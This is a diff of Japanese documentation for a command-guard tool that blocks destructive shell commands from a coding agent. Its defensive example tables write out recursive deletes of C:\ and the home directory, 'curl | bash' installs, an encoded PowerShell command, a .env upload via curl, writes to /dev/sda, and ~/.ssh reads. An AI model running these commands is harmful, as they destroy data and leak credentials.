+| `pwsh -WorkingDirectory 'C:\' -c 'Remove-Item -Recurse -Force *'` | 致命的 | `powershell.nested-recursive-delete-unread` |
+| `pwsh -NoExit -c 'rm -fr ~'` | 致命的 | `powershell.nested-recursive-delete-unread` |
+| `powershell -NoProfile -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==` | ブロック | `analysis.dynamic-shell-source` |
+| `pwsh -NoProfile -c 'Remove-Item -Recurse -Force .\build'` | 許可 | |
+| `pwsh -File report.ps1 -Action rm -Region east` | 許可 | |
 
-このスクリプトは、`posix` モードでも、外側の作業ディレクトリを基準に PowerShell として解析します。`pwsh -NoProfile -c 'Remove-Item -Recurse -Force C:\'` は `powershell.remove-item-recursive-force-root-or-home` でブロックされます。
-
-それ以外の形は読み取りません。そのテキストに削除コマンド（`Remove-Item`、`ri`、`rm`、`rmdir`、`rd`、`del`、`erase`）と再帰のスイッチがあれば、安全レベルや permission mode にかかわらず `powershell.nested-recursive-delete-unread` でブロックされます。再帰のスイッチとは、`-Recurse` と `--recursive` およびその省略形（`-r` や `-rec` など）、`r` を含む `rm` の短いフラグをまとめたもの（`-fr` など）、`/s` のことです。読み取らない形には、`-WorkingDirectory` や `-NoExit` などの他のパラメーター、`/` や Unicode のダッシュで始まるパラメーター、`-File`、位置引数として渡したスクリプト、外側のシェルが展開する語があります。再帰削除を含まない形はこのルールではブロックされませんが、その語には他のルールが引き続き適用されます。そのため `pwsh -NoExit -c git reset --hard` は `git.reset-hard` でブロックされます。
-
-読み取ったスクリプトの外に `-EncodedCommand` を指す語があると、検証できないシェルの実行元として拒否されます。`-e` や `-enc` などの省略形、別名の `-ec`、`/` や Unicode のダッシュで始まる形も対象です。`-File` で実行するスクリプトと、標準入力から読むスクリプトは読み取りません。
-
-| 例 | 結果 |
-| --- | --- |
-| `pwsh -NoProfile -c 'Remove-Item -Recurse -Force C:\'` | `powershell.remove-item-recursive-force-root-or-home` でブロック |
-| `powershell -NoProfile -ExecutionPolicy Bypass -Command 'Remove-Item -Recurse -Force C:\'` | `powershell.remove-item-recursive-force-root-or-home` でブロック |
-| `pwsh -WorkingDirectory 'C:\' -c 'Remove-Item -Recurse -Force *'` | `powershell.nested-recursive-delete-unread` でブロック |
-| `pwsh /c 'Remove-Item -Recurse -Force C:\'` | `powershell.nested-recursive-delete-unread` でブロック |
-| `pwsh -NoExit -c 'rm -fr ~'` | `powershell.nested-recursive-delete-unread` でブロック |
-| `powershell -NoProfile -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==` | 検証できないシェルの実行元として拒否 |
-| `pwsh -NoProfile -c 'Remove-Item -Recurse -Force .\build'` | ワークスペース内なので許可 |
-| `pwsh -File report.ps1 -Action rm -Region east` | 再帰のスイッチにあたる語がないので許可 |
-
-機密パスの保護も、独自のガードステージで同じ `-Command` スクリプトを読み取ります。そのため `pwsh -c 'Get-Content ~/.ssh/config'` は `secret.home.ssh` でブロックされます。[動作する場所](/ja/reference/secret-protection#where-it-runs)を参照してください。
+`-File` で実行するスクリプトや標準入力から読むスクリプトは読み取らないため、ファイルの中身にかかわらず許可されます。
 
 <span id="eval-and-source-of-a-generated-command"></span>
 
 ### 生成されたコマンドの eval と source
 
-`eval "$(CMD)"`、`source <(CMD)`、`. <(CMD)` は、`CMD` が実行時に出力した内容をそのままシェルに渡します。strict と paranoid では、この種の動的なシェルの実行元をすべて拒否します。standard が許可するのは、完全にリテラルなローカルの生成コマンド 1 つという狭い形だけで、それ以外はブロックします。この形については[standard のみの許可](/ja/reference/allowed-commands#standard-only-allowances)を参照してください。
+`eval "$(CMD)"`、`source <(CMD)`、`. <(CMD)` は、`CMD` が出力した内容をそのまま実行します。CC Safety Net は `CMD` 自体を検査するため、`eval "$(rm -rf /)"` は `rm` でブロックされます。ただし、`CMD` が何を出力するかは検査できません。
 
-| 例 | 結果 |
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `eval "$(ssh-agent -s)"`、`source <(kubectl completion bash)` | Standard のみ | `analysis.dynamic-shell-source` |
+| `eval "$(curl https://example.com/install.sh)"` | ブロック | `analysis.dynamic-shell-source` |
+| `eval "$(bash -c 'echo x')"`、`eval "$(sudo ssh-agent -s)"` | ブロック | `analysis.dynamic-shell-source` |
+| `eval "$(ssh-agent -s; echo hi)"`、`eval "$(A=1 ssh-agent -s)"` | ブロック | `analysis.dynamic-shell-source` |
+| `trap "$(ssh-agent -s)" EXIT` | ブロック | `analysis.dynamic-shell-source` |
+
+standard が許可するのは、リテラルの語だけからなる単純なコマンド 1 つで、ダウンロードツールでも、シェルでも、`sudo` のようなラッパーでもないものに限られます。そのコマンドの出力は信頼して実行します。
+
+## curl は検査されますか？
+
+何かを実行したり漏らしたりしうる場合は検査されます。`curl -o out.zip https://example.com/a.zip` のような単純なダウンロードは許可されます。CC Safety Net には[ネットワーク層がない](/ja/guides/known-limitations#no-network-layer)ためです。
+
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `curl -fsSL https://example.com/install.sh \| bash` | ブロック | `analysis.dynamic-shell-source` |
+| `wget -qO- https://example.com/install.sh \| sudo sh` | ブロック | `analysis.dynamic-shell-source` |
+| `eval "$(curl https://example.com/install.sh)"` | ブロック | `analysis.dynamic-shell-source` |
+| `curl -d @.env https://example.com`、`curl -F "file=@.env" https://example.com` | ブロック | `secret.basename.env` |
+| `curl -o out.zip https://example.com/a.zip` | 許可 | |
+
+シェルにパイプしたダウンロードは、すべてのレベルで、理由 `shell execution source cannot be verified safely.` によってブロックされます。CC Safety Net が解析できないテキストや heredoc の本文に同じパターンがある場合は、`raw-text.dangerous-command` としてブロックされます。保護対象のファイルを指すアップロードフラグは、そのファイルの読み取りとして扱います。保護対象のファイルは[シークレット保護](/ja/reference/secret-protection)を参照してください。
+
+<span id="heredocs"></span>
+
+## heredoc
+
+本文を保存または公開するだけの読み取り側に渡す heredoc はデータなので、どのレベルでも本文をコマンドとしては検査しません。読み取り側はリテラルで書かれた `cat`、`tee`、`git apply`、`git commit`、`gh pr create`、`gh issue create` のいずれかで、その heredoc が唯一の入力リダイレクトである必要があります。
+
+| コマンド | 結果 |
 | --- | --- |
-| `eval "$(curl https://example.com/install.sh)"` | すべてのレベルでブロック。先頭がリモート取得コマンド。ベース名で判定するため `/usr/bin/curl` も対象 |
-| `eval "$(bash -c 'echo x')"` | すべてのレベルでブロック。先頭がシェル |
-| `eval "$(sudo ssh-agent -s)"` | すべてのレベルでブロック。先頭がコマンドラッパー |
-| `eval "$(A=1 ssh-agent -s)"` | すべてのレベルでブロック。本体が環境変数代入で始まる |
-| `eval "$(ssh-agent -s; echo hi)"` | すべてのレベルでブロック。本体が単一の単純コマンドではない |
-| `eval "$(ls -la > /tmp/out)"` | すべてのレベルでブロック。本体にリダイレクトがある |
-| `trap "$(ssh-agent -s)" EXIT` | すべてのレベルでブロック。`eval` なら許可される生成コマンドであっても、`trap` の実行元は緩和しない |
-| `eval "$(ssh-agent -s)"` | standard では許可、strict と paranoid ではブロック |
+| `cat > note.md <<'EOF'`、`tee note.md <<'EOF'` | 許可 |
+| `git apply <<'PATCH'`、`git commit -F - <<'EOF'` | 許可 |
+| `gh pr create --body-file - <<'EOF'`、`gh issue create -F - <<'EOF'` | 許可 |
+| `cat <<'EOF' && rm -rf ~` | `rm` により致命的 |
+| `python3 - <<'PY'` | standard では Python のコードとして検査、strict と paranoid ではブロック |
 
-生成コマンドの本体は他のコマンドと同じように解析します。そのため `eval "$(rm -rf /)"` は `rm` でブロックし、`source <(git reset --hard)` は reset でブロックします。
+standard では、それ以外の heredoc の本文はテキストとして破壊的なパターンを検査します。heredoc で書き出したスクリプトを同じコマンドで実行する場合（`cat > x.sh <<'EOF' … EOF && bash x.sh` など）は、すべてのレベルでそのスクリプトを検査します。
 
-### インタープリターの 1 行コードをすべてブロックする
-
-内容にかかわらずインタープリターの 1 行コードをブロックしたい場合は、`CC_SAFETY_NET_PARANOID_INTERPRETERS=1` を設定します。危険なコードが含まれていなくても、`python -c`、`node -e`、`ruby -e`、`perl -e` のすべての 1 行コードがブロックされます。`python -c "print(1)"` は standard と strict では許可されますが、ここではブロックされます。[モード](/ja/configuration/modes#paranoid-interpreters)を参照してください。
-
-<span id="heredocs-in-strict-and-paranoid"></span>
-
-## `strict` と `paranoid` の heredoc
-
-フェイルクローズの機能が有効な場合、heredoc を含むコマンドは、次の条件をすべて満たすときにだけ許可されます。
-
-- コマンドに含まれる heredoc が 1 つだけであること。
-- その heredoc が標準入力に接続されていること。
-- 展開されない heredoc であること。デリミタが引用符で囲まれているか、引用符がなくても本文に `$`、バッククォート、バックスラッシュが含まれないことを指します。
-- 他に入力リダイレクトがないこと。
-- 読み取り側が、リテラルで書かれた `cat`、`tee`、`git apply`、`git commit`、`gh pr create`、`gh issue create` のいずれかであること。
-
-フェイルクローズの機能は、[strict](/ja/configuration/modes#strict-mode) と [paranoid](/ja/configuration/modes#paranoid-mode) で有効になります。デリミタに引用符がなく、本文に `$`、バッククォート、バックスラッシュのいずれかが含まれる場合は、次の理由で拒否されます。
+strict と paranoid で heredoc が許可されるのは、コマンドに含まれる heredoc が標準入力への 1 つだけで、読み取り側が上記のいずれかであり、本文が展開されない場合だけです。展開されないとは、デリミタが引用符で囲まれているか、本文に `$`、バッククォート、バックスラッシュが含まれないことを指します。デリミタに引用符がなく、本文にこれらの文字が含まれる場合は、次の理由で拒否されます。
 
 ```text
 Unquoted heredoc input is not supported safely. Quote the delimiter or ask the user to verify.
@@ -400,29 +428,41 @@ Unquoted heredoc input is not supported safely. Quote the delimiter or ask the u
 This heredoc form or stdin consumer is not supported safely. Use a quoted heredoc with a supported consumer (cat, tee, git apply, git commit, gh pr create, gh issue create), or ask the user to verify.
 ```
 
-standard モードでの heredoc 本文の扱いを含む詳細な仕様は、[解析エンジン](/ja/guides/analysis-engine)にあります。
-
 ## 解析できないコマンドテキスト
 
-シェルのパーサーがコマンドをトークンに分割できない場合（引用符が閉じていない場合など）、その後の挙動は安全レベルによって変わります。
+閉じていない引用符を含む場合など、シェルのパーサーがコマンドを読み取れないときの結果は、安全レベルによって変わります。
 
-| 入力 | `standard` | `strict` と `paranoid` |
+| コマンド | Standard | Strict と Paranoid |
 | --- | --- | --- |
-| `echo 'unterminated` | 許可。安全に見える解析不能なテキストは通す | ブロック。「安全に解析できなかった」として拒否 |
-| `git reset --hard 'unterminated` | ヒューリスティックなスキャンで**ブロック** | ブロック |
-| `dd if=/dev/zero of=/dev/sda 'oops` | ヒューリスティックなスキャンで**ブロック** | ブロック |
-| `echo ${ date; }` | パーサーが構文そのものを拒否するため**ブロック** | ブロック |
+| `echo 'unterminated` | 許可 | ブロック、`analysis.strict-unparseable` |
+| `git reset --hard 'unterminated` | ブロック、`raw-text.dangerous-command` | ブロック |
+| `dd if=/dev/zero of=/dev/sda 'oops` | ブロック、`raw-text.dangerous-command` | ブロック |
+| `echo ${ date; }` | ブロック、`analysis.strict-unparseable` | ブロック |
 
-POSIX パーサーが構文そのものを拒否すると、その解析は無効になります。無効な解析はすべてのレベルで拒否され、ヒューリスティックなスキャンも実行されないため、その形式に当てはまる無害なコマンドも拒否されます。対象は、`${ list; }` の関数置換、置換を隠している可能性のある `${…}` の中の引用符やバックスラッシュ、閉じブレースのない `${…}`、バッククォートの本体にあるバックスラッシュのエスケープです。正確な形式と、許可されたままの例は[パーサーが拒否するシェル構文](/ja/guides/analysis-engine#shell-syntax-the-parser-refuses)にあります。
+standard では、解析できないテキストに `rm -rf`、`git reset --hard`、`dd of=/dev/`、シェルにパイプしたダウンロードなどの破壊的なパターンがないかをスキャンします。一致すると `raw-text.dangerous-command` としてブロックします。`${ list; }` の関数置換など一部のシェル構文は、コマンドが無害でも、すべてのレベルで拒否します。
 
-ヒューリスティックなスキャンが確認するのは、`rm -rf`、`git reset --hard`、`git reset --merge`、`git clean -f`、`git checkout --force`、`git checkout --`、`git push --force`、`git push --delete`、`git branch -D`、`git tag -d`、`git stash drop`、`git stash clear`、`--staged` を伴わない `git restore`、`find -delete`、`dd of=/dev/`、`mkfs /dev/`、`shred <arg>` です。一致した場合は、ルール `raw-text.dangerous-command` で拒否します。テキストが `echo ` または `rg ` で始まる場合、`find`、`dd`、`mkfs`、`shred` のパターンは対象外になるため、これらの文字列を echo や ripgrep の引数として引用符で囲んでもスキャンには引っかかりません。
+特定のコマンドがブロックまたは許可された理由を確認するには、[`explain`](/ja/reference/cli/explain) を実行します。
 
-スキャンはさらに、シェルへパイプしたダウンロード、つまりリモートインストールのワンライナーを探します。リモート取得コマンド（`curl`、`wget`、`fetch`、`aria2c`、`http`、`https`、`xh`、`xhs`、`nc`、`ncat`、`netcat`）を `sh`、`bash`、`zsh`、`dash`、`ksh` のいずれかにパイプしていれば、`raw-text.dangerous-command` で拒否します。シェル名にパスが付いていても（`| /bin/sh`）、`sudo`、`env`、`command`、`builtin` のラッパーを挟んでいても（`| sudo sh`、`| env VAR=1 sh`）同じです。コマンドの途中やパイプの前後にバックスラッシュ改行を入れても隠せません。このパターンも、テキストが `echo ` または `rg ` で始まる場合は対象外になるため、echo で表示するインストール行はデータのままです。同じパイプラインが実際のコマンドとして解析できる場合は、代わりに構造から「shell execution source cannot be verified safely」の理由で拒否します。テキストスキャンは、heredoc の本文のようにパーサーが中まで降りないテキストで、これを捕捉します。
+<span id="fixed-denial-ids"></span>
 
-<Warning>
-  リソース枯渇を防ぐための上限は、レベルの仕組みとは独立しており、standard を含む**すべて**のモードで拒否につながります。宣言されたコマンドの再帰上限や、構造的な検証の上限を超えた場合は、常に拒否され、通過することはありません。
-</Warning>
+## 固定の拒否 ID
 
-<Note>
-  `explain` コマンドを使うと、CC Safety Net が特定のコマンドをブロックまたは許可した理由を正確にたどれます。指定できるフラグは [CLI コマンド](/ja/reference/cli-commands#explain)、JSON のスキーマは [explain トレース](/ja/reference/explain-trace)を参照してください。
-</Note>
+ルールによらない拒否もあります。コマンド解析の前に実行されるガード、解析の上限と失敗、使用できない作業ディレクトリによる拒否です。これらには固定の ID が付き、ブロックメッセージ、[監査ログ](/ja/reference/audit-log)、`explain --json` の `ruleId` フィールド、[`checkCommand`](/ja/reference/library-api) が返す拒否の `ruleId` に表示されます。これらの ID は登録済みのルールではないため、`destructive_command_protection.overrides` には指定できません。`policy check` は、いずれも `unknown destructive command rule id "<id>"` として拒否します。
+
+| ID | 拒否する条件 |
+| --- | --- |
+| `guard.policy-config` | 書き込み、移動、再帰削除が、保護対象の `policy.json` またはそれを含むディレクトリに及ぶ |
+| `guard.policy-apply` | コマンドが `cc-safety-net policy apply` を実行する |
+| `guard.git-metadata` | 削除、移動、書き込みが、解決済みの `.git` エントリ、そのディレクトリ、またはフックディレクトリを対象にする |
+| `analysis.recursion-limit` | ネストが再帰の深さの上限を超える |
+| `analysis.structural-limit` | コマンドの構造が、安全に検証できる上限を超える |
+| `analysis.limit` | コマンドが、安全に解析できる上限を超える |
+| `analysis.derived-command-limit` | アナライザーが、派生コマンドの処理量の上限を超える |
+| `analysis.failed-closed` | ガードが予期せず失敗した、またはツール呼び出しを読み取れなかったため、フェイルクローズになった |
+| `analysis.strict-unparseable` | パーサーがコマンドを受け付けない、または strict モードでコマンドを完全にはパースできない |
+| `analysis.unsupported-heredoc` | strict モードで、パーサーが対応していない heredoc 構文をコマンドが使っている |
+| `analysis.dynamic-shell-source` | シェルが、リテラル文字列ではないスクリプトテキストを実行する（`sh -c "$CMD"` など） |
+| `cwd.session-unusable` | セッションの作業ディレクトリまたはワークスペースルートが存在しない、アクセスできない、ディレクトリではない、または対応していないパス形式である |
+| `cwd.session-outside-workspace` | セッションの作業ディレクトリが、ワークスペースルートの外にある |
+| `cwd.requested-unusable` | ツール呼び出しまたは `checkCommand` が指定した作業ディレクトリが存在しない、アクセスできない、ディレクトリではない、または対応していないパス形式である |
+| `cwd.requested-outside-workspace` | ツール呼び出しが指定した作業ディレクトリが、セッションのワークスペースの外にある |
